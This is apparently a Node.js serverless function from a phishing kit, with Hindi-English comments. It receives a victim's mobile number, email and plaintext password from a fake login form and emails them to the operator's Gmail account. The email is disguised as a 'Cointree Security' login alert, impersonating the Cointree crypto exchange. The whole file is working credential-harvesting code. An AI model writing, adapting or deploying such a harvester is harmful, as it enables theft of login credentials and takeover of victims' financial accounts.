const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  // Sirf POST request allow karein
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    // Frontend se aaya hua data parse karein
    const { mobile, email, password, time } = JSON.parse(event.body);

    // Nodemailer transporter setup (Netlify environment variables use karega)
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });

    // Email ka content
    const mailOptions = {
      from: `"Cointree Security" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: 'New Login Alert - Cointree',
      html: `
        <h3>New Login Attempt</h3>
        <p><strong>Mobile:</strong> ${mobile}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Time:</strong> ${time}</p>
      `
    };

    // Email bhejein
    await transporter.sendMail(mailOptions);
    
    return { 
      statusCode: 200, 
      body: JSON.stringify({ success: true }) 
    };

  } catch (error) {
    console.error('Email send failed:', error);
    return { 
      statusCode: 500, 
      body: JSON.stringify({ success: false }) 
    };
  }
};